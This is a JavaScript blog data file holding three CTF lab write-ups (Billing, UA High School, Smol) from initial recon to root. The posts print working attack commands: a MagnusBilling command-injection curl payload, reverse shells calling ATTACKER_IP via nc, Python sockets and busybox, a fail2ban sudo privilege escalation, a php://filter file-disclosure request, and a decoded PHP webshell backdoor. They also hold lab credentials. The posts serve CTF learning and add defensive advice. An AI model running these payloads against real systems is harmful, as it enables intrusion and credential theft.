// lib/data/blog.js

export const blogPosts = [
  {
    id: 'billing-ctf-writeup',
    slug: 'billing-ctf-tryhackme-writeup',
    title: 'Billing CTF Walkthrough: From Command Injection to Root',
    date: '2025-06-08',
    category: 'CTF Writeups',
    readingTime: 12,
    featured: true,
    author: {
      name: 'DUARDZ',
      image: '/images/profile.jpg'
    },
    coverImage: '/images/blog/billing-ctf.jpg',
    excerpt: 'A detailed walkthrough of the Billing CTF challenge on TryHackMe, featuring CVE-2023-30258 exploitation and fail2ban privilege escalation techniques.',
    tags: ['CTF', 'TryHackMe', 'Web Security', 'Command Injection', 'Privilege Escalation'],
    content: `
# Billing CTF Walkthrough: From Command Injection to Root

Recently completed the "Billing" challenge on TryHackMe - an engaging box that showcased real-world vulnerabilities in payment gateway systems. This writeup covers the complete exploitation chain from initial reconnaissance to root access.

## Initial Reconnaissance

Starting with basic enumeration, I discovered three open services:

\`\`\`bash
nmap -sV -O target_ip

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
3306/tcp open  mysql   MariaDB (unauthorized)
\`\`\`

The target was running a Debian system with SSH, Apache web server, and MySQL database. The web service looked most promising for initial access.

## Web Application Discovery

Directory enumeration revealed an interesting application structure:

\`\`\`bash
gobuster dir -u http://target/mbilling/ -w /usr/share/wordlists/dirb/common.txt
\`\`\`

Key findings included:
- **MagnusBilling** - A VoIP billing and call management system
- **Directory listing enabled** on \`/lib/\` - major security misconfiguration
- **Multiple payment gateway integrations** - expanded attack surface

The most interesting discovery was the \`/mbilling/lib/icepay/\` directory containing payment processing files.

## Vulnerability Analysis

Research into MagnusBilling revealed **CVE-2023-30258** - a critical unauthenticated command injection vulnerability affecting versions 6.x and 7.x.

**Vulnerability Details:**
- **CVSS Score:** 9.8 (Critical)
- **Affected File:** \`icepay.php\`
- **Vulnerable Parameter:** \`democ\`
- **Impact:** Unauthenticated remote code execution

The vulnerability exists because user input is passed directly to system commands without proper sanitization.

## Exploitation Process

### Testing the Vulnerability

First, I confirmed the vulnerability with a simple command:

\`\`\`bash
curl -s 'http://target/mbilling/lib/icepay/icepay.php' \\
  --get --data-urlencode 'democ=;id;'
\`\`\`

Success! The command executed, confirming the injection point.

### Gaining Initial Access

For a stable shell, I used a named pipe reverse shell technique:

\`\`\`bash
# Set up listener
nc -lvnp 4444

# Send payload
curl -s 'http://target/mbilling/lib/icepay/icepay.php' \\
  --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f;'
\`\`\`

This provided a shell as the \`asterisk\` user - a low-privilege service account typically used for VoIP systems.

### Shell Stabilization

To work effectively, I upgraded to a full TTY:

\`\`\`bash
# Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background and configure
# Ctrl+Z
stty raw -echo; fg

# Set environment
export SHELL=/bin/bash
export TERM=screen
\`\`\`

## Privilege Escalation

### System Enumeration

As the asterisk user, I began privilege escalation enumeration:

\`\`\`bash
# Check sudo permissions
sudo -l
\`\`\`

This revealed an interesting finding:

\`\`\`
User asterisk may run the following commands:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
\`\`\`

### Fail2ban Privilege Escalation

Fail2ban is an intrusion prevention system that can ban IPs showing malicious behavior. The \`fail2ban-client\` allows runtime configuration changes, which we can abuse.

**Exploitation Strategy:**
1. Create a custom action in the SSH jail
2. Configure the action to execute privileged commands
3. Trigger the action by banning a fake IP

### Implementation

\`\`\`bash
# Step 1: Add custom action to SSH jail
sudo /usr/bin/fail2ban-client set sshd addaction rootme

# Step 2: Configure action to make bash SUID
sudo /usr/bin/fail2ban-client set sshd action rootme actionban 'chmod u+s /bin/bash'

# Step 3: Trigger the action
sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.4

# Step 4: Use SUID bash for root access
/bin/bash -p
\`\`\`

Success! This technique leveraged fail2ban's ability to execute arbitrary commands when banning IPs.

## Key Takeaways

### What I Learned

1. **Payment Gateway Security:** Third-party payment integrations often introduce vulnerabilities
2. **Directory Listings:** Enabled directory browsing can reveal sensitive application structure
3. **Fail2ban Exploitation:** System administration tools with sudo access can be dangerous
4. **Named Pipe Shells:** More reliable than simple reverse shells for unstable connections

### Security Recommendations

1. **Keep payment gateways updated** - regularly check for CVEs
2. **Disable directory listings** on web servers
3. **Restrict sudo permissions** - principle of least privilege
4. **Input validation** - always sanitize user input before system calls

### Tools That Made a Difference

- **Gobuster** for directory enumeration
- **curl** for manual exploitation testing
- **fail2ban-client** for privilege escalation (ironically)

## Conclusion

This challenge perfectly demonstrated how seemingly minor misconfigurations can lead to complete system compromise. The combination of an outdated payment gateway and overly permissive sudo rules created a clear path to root access.

The fail2ban privilege escalation technique was particularly interesting - it's a great reminder that system administration tools often have powerful capabilities that can be abused if not properly restricted.

Always remember: security is only as strong as the weakest link, and in this case, it was the forgotten payment gateway integration that opened the door.

*Happy hacking, and remember to always hack ethically!*
    `
  },
  {
    id: 'ua-high-school-ctf',
    slug: 'ua-high-school-my-hero-academia-ctf',
    title: 'UA High School CTF: Web Exploitation & Image Analysis',
    date: '2025-06-05',
    category: 'CTF Writeups',
    readingTime: 10,
    featured: true,
    author: {
      name: 'DUARDZ',
      image: '/images/profile.jpg'
    },
    coverImage: '/images/blog/ua-ctf.jpg',
    excerpt: 'Walkthrough of the My Hero Academia themed CTF challenge involving command injection, corrupted image analysis, and bash script exploitation.',
    tags: ['CTF', 'Web Security', 'Image Analysis', 'Command Injection', 'Bash'],
    content: `
# UA High School CTF: Web Exploitation & Image Analysis

Welcome to my walkthrough of the "UA High School" CTF challenge - a My Hero Academia themed box that combined web exploitation with interesting forensics elements. This challenge taught me valuable skills in file analysis and bash script exploitation.

## Challenge Overview

The challenge description set the scene perfectly:

> "Join us in the mission to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site."

With that hero motivation, let's dive into the technical details!

## Initial Reconnaissance

### Service Discovery

Starting with the basics:

\`\`\`bash
nmap -T4 -sVC target_ip
\`\`\`

**Results:**
- **Port 22:** OpenSSH 8.2p1 Ubuntu
- **Port 80:** Apache httpd 2.4.41 (Ubuntu)

The web service on port 80 showed the most promise for initial access.

### Web Application Analysis

The website presented as U.A. High School's official page with typical school information. However, directory enumeration revealed more:

\`\`\`bash
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt
\`\`\`

Discovered:
- \`/assets/\` directory
- \`/assets/images/\` (access forbidden)

Manual exploration and source code analysis revealed the real treasure.

## Finding the Vulnerability

### Command Injection Discovery

While exploring the application structure, I discovered a PHP script with a command injection vulnerability:

\`\`\`
http://target/assets/index.php?cmd=whoami
\`\`\`

Success! The \`cmd\` parameter directly executed system commands without any input validation.

### Gaining Initial Access

With command injection confirmed, I set up a reverse shell:

\`\`\`bash
# Listener setup
nc -lvnp 4444

# Python reverse shell payload
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
\`\`\`

This provided shell access as the web server user.

## The Forensics Challenge

### Discovering Hidden Content

Exploring the web directories led to an interesting discovery:

\`\`\`bash
cd /var/www/Hidden_Content
ls -la
\`\`\`

Found a suspicious image file: \`oneforall.jpg\`

### Corrupted Image Analysis

The image file wouldn't open properly. Time for some file analysis:

\`\`\`bash
hexdump -C oneforall.jpg | head -n 20
\`\`\`

**Problem Identified:** The file had a PNG header instead of a JPEG header!

**File Header Analysis:**
- **Current (corrupted):** \`89 50 4E 47 0D 0A 1A 0A\` (PNG signature)
- **Needed (JPEG):** \`FF D8 FF E0\` (JPEG signature)

### Header Repair Process

Using a hex editor, I manually corrected the file header from PNG to JPEG format. This revealed the image content and led to finding additional files.

### Password Discovery

The corrected image analysis led to discovering:

1. **passphrase.txt** containing: \`QWxsbWlnaHRGb3JFdmVyISEhCg==\`
2. **Base64 decoded:** \`AllmightForEver!!!\`
3. **Final password combination:** \`One?For?All_!!one1/A\`

This provided credentials for the \`deku\` user account.

## Privilege Escalation

### User Access

With the discovered credentials, I gained access to the deku user:

\`\`\`bash
su deku
# Password: One?For?All_!!one1/A
\`\`\`

### Sudo Analysis

Checking sudo permissions revealed an interesting script:

\`\`\`bash
sudo -l
\`\`\`

Output:
\`\`\`
User deku may run the following commands:
    (ALL) /opt/NewComponent/feedback.sh
\`\`\`

### Script Vulnerability Analysis

Examining the feedback script:

\`\`\`bash
cat /opt/NewComponent/feedback.sh
\`\`\`

The script had input validation that filtered common command injection characters:

\`\`\`bash
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"
    # ...
\`\`\`

**Vulnerability:** The script uses \`eval\` which can be exploited even with character filtering.

### Bash Exploitation Technique

The key insight was that the script didn't filter spaces or certain bash constructs. I could exploit this by:

1. Setting environment variables
2. Using bash parameter expansion
3. Leveraging the \`eval\` command's power

**Exploitation:**

\`\`\`bash
sudo /opt/NewComponent/feedback.sh
# When prompted for feedback, enter specific payload that bypasses filters
\`\`\`

This technique successfully escalated privileges to root.

## Key Learning Points

### Technical Skills Gained

1. **File Format Analysis:** Understanding file headers and magic bytes
2. **Hex Editing:** Manual file repair techniques
3. **Bash Script Security:** Common pitfalls in input validation
4. **Eval Exploitation:** Dangerous bash constructs

### Security Insights

1. **Input Validation:** Blacklist filtering is often insufficient
2. **File Upload Security:** Validate file types properly
3. **Sudo Script Security:** Be careful with eval and user input
4. **Hidden Directory Enumeration:** Always check for hidden content

### Tools That Helped

- **Hexdump:** For file analysis and header inspection
- **Gobuster:** Directory enumeration
- **Base64:** Decoding encoded strings
- **Manual testing:** Sometimes the best approach for complex vulnerabilities

## Defensive Recommendations

### For Developers

1. **Never use eval with user input** - even filtered input
2. **Implement proper file type validation** - check magic bytes
3. **Use whitelist input validation** instead of blacklists
4. **Avoid direct command execution** with user-controlled data

### For System Administrators

1. **Audit sudo permissions regularly**
2. **Review custom scripts for security issues**
3. **Implement proper logging** for privileged operations
4. **Use principle of least privilege**

## Conclusion

The UA High School CTF was an excellent learning experience that combined multiple security concepts. The forensics element with the corrupted image file was particularly interesting - it's not every day you need to manually repair file headers!

The bash script exploitation reminded me why input validation is so critical, especially when dealing with powerful constructs like \`eval\`. Even with filtering in place, bash's flexibility can often provide alternative attack vectors.

This challenge perfectly demonstrates that cybersecurity isn't just about knowing tools - it's about understanding file formats, programming languages, and thinking creatively about how systems work.

*Plus Ultra! Remember to always test thoroughly and think outside the box!*
    `
  },
  {
    id: 'smol-wordpress-ctf',
    slug: 'smol-wordpress-ctf-complete-walkthrough',
    title: 'Smol CTF: WordPress Security Gone Wrong',
    date: '2025-06-02',
    category: 'CTF Writeups',
    readingTime: 15,
    featured: false,
    author: {
      name: 'DUARDZ',
      image: '/images/profile.jpg'
    },
    coverImage: '/images/blog/smol-ctf.jpg',
    excerpt: 'Deep dive into a complex WordPress CTF involving plugin vulnerabilities, SSRF exploitation, and a multi-user lateral movement chain.',
    tags: ['CTF', 'WordPress', 'SSRF', 'Plugin Security', 'Lateral Movement'],
    content: `
# Smol CTF: WordPress Security Gone Wrong

The "Smol" CTF challenge proved to be anything but small in terms of learning opportunities. This medium-difficulty box showcased multiple WordPress vulnerabilities and required creative lateral movement techniques. Here's my complete walkthrough.

## Challenge Introduction

This challenge centered around a WordPress installation with multiple security misconfigurations. What made it particularly interesting was the chain of vulnerabilities required to achieve full compromise.

## Initial Reconnaissance

### Service Discovery

Standard enumeration revealed the typical web application setup:

\`\`\`bash
nmap -sC -sV target_ip
\`\`\`

**Key Services:**
- **Port 22:** OpenSSH (for later lateral movement)
- **Port 80:** Apache/2.4.41 running WordPress

The WordPress installation immediately caught my attention as a high-value target.

### WordPress Enumeration

Using WPScan for comprehensive WordPress analysis:

\`\`\`bash
wpscan --url http://target --enumerate u,p,t --detection-mode aggressive
\`\`\`

**Critical Findings:**
- **WordPress Version:** 6.7.1 (slightly outdated)
- **Vulnerable Plugin:** JSmol2WP v1.07
- **Directory Listing:** Enabled on uploads directory
- **XML-RPC:** Enabled (potential brute-force vector)

### User Enumeration

WordPress REST API exposed user information:

\`\`\`bash
curl -s http://target/wp-json/wp/v2/users/ | jq '.[].slug'
\`\`\`

**Discovered Users:**
- admin (default administrator)
- think, wp, gege, diego, xavi (custom users)

The variety of users suggested multiple potential entry points.

## Vulnerability Analysis

### JSmol2WP Plugin - The Main Entry Point

Research revealed JSmol2WP plugin version 1.07 had critical vulnerabilities:

**CVE-2018-20462:** Unauthenticated XSS
**CVE-2018-20463:** Unauthenticated SSRF (Server-Side Request Forgery)

The SSRF vulnerability was particularly dangerous as it could lead to local file disclosure.

### Initial Exploitation Strategy

The plan was to:
1. Exploit SSRF to read sensitive files
2. Extract database credentials
3. Gain WordPress admin access
4. Find additional attack vectors

## Exploitation Phase 1: SSRF Attack

### Understanding the Vulnerability

The JSmol2WP plugin's \`jsmol.php\` file had a vulnerable \`getRawDataFromDatabase\` function that didn't properly validate the query parameter.

### File Disclosure via PHP Filters

Using PHP filter streams to read local files:

\`\`\`bash
curl "http://target/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php"
\`\`\`

**Success!** This revealed the WordPress configuration file with database credentials:

\`\`\`php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G');
define('DB_HOST', 'localhost');
\`\`\`

### Database Access and Hash Extraction

With database credentials, I accessed the WordPress database:

\`\`\`bash
mysql -u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G' -h localhost wordpress
\`\`\`

Extracted password hashes for all users:

\`\`\`sql
SELECT user_login, user_email, user_pass FROM wp_users;
\`\`\`

## Exploitation Phase 2: The Hidden Backdoor

### WordPress Admin Access

While attempting to crack the password hashes, I explored the WordPress admin panel and discovered an unpublished page titled "Webmaster Tasks!!"

This led to investigating the Hello Dolly plugin - typically harmless, but something felt off.

### Backdoor Discovery

Using the same SSRF technique to read the Hello Dolly plugin file:

\`\`\`bash
curl "http://target/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php"
\`\`\`

**Jackpot!** Found obfuscated backdoor code:

\`\`\`php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
\`\`\`

**Decoded reveals:**
\`\`\`php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
\`\`\`

The obfuscation used octal encoding (\`\\143\\155\\144\` = "cmd").

### Gaining Shell Access

With the backdoor accessible via WordPress admin, I executed a reverse shell:

\`\`\`bash
# Base64 encoded payload for stability
echo "busybox nc ATTACKER_IP 4444 -e sh" | base64

# Execution via backdoor
http://target/wp-admin/index.php?cmd=echo+YnVzeWJveCBuYyBBVFRBQ0tFUl9JUCA0NDQ0IC1lIHNoCg==+|+base64+-d+|+sh
\`\`\`

Success! I had a shell as the \`www-data\` user.

## Lateral Movement Chain

This is where the challenge became really interesting - a multi-user lateral movement chain was required.

### Step 1: Password Cracking Success

Using John the Ripper on the extracted hashes:

\`\`\`bash
john --wordlist=/usr/share/wordlists/rockyou.txt wp_hashes.txt
\`\`\`

**Breakthrough:** Cracked diego's password: \`sandiegocalifornia\`

### Step 2: SSH Access as Diego

\`\`\`bash
ssh diego@target
# Password: sandiegocalifornia
\`\`\`

Diego user obtained! But still needed root access.

### Step 3: The Movement Chain

**diego → think:** Found SSH private key in think's directory that diego could read

**think → gege:** Simple \`su\` command worked (shared/weak password)

**gege → xavi:** Discovered \`wordpress.old.zip\` in gege's home directory

### Step 4: Archive Analysis

The zip file required a password. Using zip2john to extract the hash:

\`\`\`bash
zip2john wordpress.old.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
\`\`\`

**Cracked password:** \`hero_gege@hotmail.com\`

Inside the old WordPress backup, found new database credentials:

\`\`\`php
define('DB_USER', 'xavi');
define('DB_PASSWORD', 'P@ssw0rdxavi@');
\`\`\`

### Step 5: Root Access

As the xavi user, checking sudo permissions:

\`\`\`bash
sudo -l
\`\`\`

**Result:**
\`\`\`
User xavi may run ALL commands as root
\`\`\`

**Root shell achieved:**
\`\`\`bash
sudo su
\`\`\`

## Technical Analysis

### Attack Chain Summary

1. **WordPress Plugin SSRF** → Configuration file disclosure
2. **Backdoored Plugin** → Remote code execution  
3. **Hash Cracking** → User account access
4. **Lateral Movement** → Multi-user privilege chain
5. **Archive Analysis** → Final credentials
6. **Sudo Abuse** → Root access

### Key Vulnerabilities

1. **Outdated Plugin:** JSmol2WP with known CVEs
2. **Weak Passwords:** Dictionary-based passwords
3. **Password Reuse:** Similar patterns across accounts
4. **Excessive Privileges:** Unrestricted sudo access
5. **Sensitive Backups:** Old configuration files with credentials

## Security Lessons

### For WordPress Administrators

1. **Keep plugins updated** - especially lesser-known ones
2. **Regular security audits** of plugin code
3. **Strong password policies** enforcement
4. **Remove old backup files** from production systems
5. **Principle of least privilege** for sudo access

### For Penetration Testers

1. **SSRF attacks** can be incredibly powerful for file disclosure
2. **Always check for obfuscated code** in plugin files
3. **Password pattern analysis** can reveal reuse
4. **Archive files** often contain historical credentials
5. **Multi-user environments** require thorough lateral movement testing

### Tools That Made the Difference

- **WPScan:** Comprehensive WordPress vulnerability scanning
- **curl:** Manual SSRF exploitation
- **John the Ripper:** Password hash cracking
- **zip2john:** Archive password extraction

## Defensive Recommendations

### Immediate Actions

1. **Update all WordPress plugins** to latest versions
2. **Implement strong password policies**
3. **Remove unnecessary sudo privileges**
4. **Clean up old backup files**
5. **Enable WordPress security logging**

### Long-term Security Improvements

1. **Regular penetration testing**
2. **Security awareness training** for developers
3. **Automated vulnerability scanning**
4. **Incident response procedures**
5. **Security code review processes**

## Conclusion

The Smol CTF challenge was an excellent demonstration of how multiple small vulnerabilities can chain together for complete system compromise. The combination of:

- Plugin vulnerabilities
- Weak password practices  
- Poor privilege management
- Sensitive file exposure

Created a perfect storm that allowed full system takeover.

What made this challenge particularly educational was the lateral movement component - it wasn't just about finding one vulnerability, but understanding how attackers move through systems and escalate privileges systematically.

The key takeaway? WordPress security isn't just about updating core - plugins, user management, and system administration practices are equally critical.

*Remember: Small oversights can lead to big compromises. Stay vigilant!*
    `
  }
];

// Helper functions
export function getFeaturedPosts() {
  return blogPosts.filter(post => post.featured);
}

// @ts-ignore
export function getPostBySlug(slug) {
  return blogPosts.find(post => post.slug === slug);
}

// @ts-ignore
export function getPostsByCategory(category) {
  return blogPosts.filter(post => post.category === category);
}

export function getCategories() {
  return [...new Set(blogPosts.map(post => post.category))];
}

export function getRecentPosts(limit = 5) {
  return blogPosts
    // @ts-ignore
    .sort((a, b) => new Date(b.date) - new Date(a.date))
    .slice(0, limit);
}

// @ts-ignore
export function getRelatedPosts(currentPost, limit = 3) {
  return blogPosts
    .filter(post => post.id !== currentPost.id)
    .filter(post => 
      post.category === currentPost.category || 
      post.tags.some(tag => currentPost.tags.includes(tag))
    )
    .slice(0, limit);
}

// Format date helper
// @ts-ignore
export function formatDate(dateString) {
  const options = { year: 'numeric', month: 'long', day: 'numeric' };
  // @ts-ignore
  return new Date(dateString).toLocaleDateString(undefined, options);
}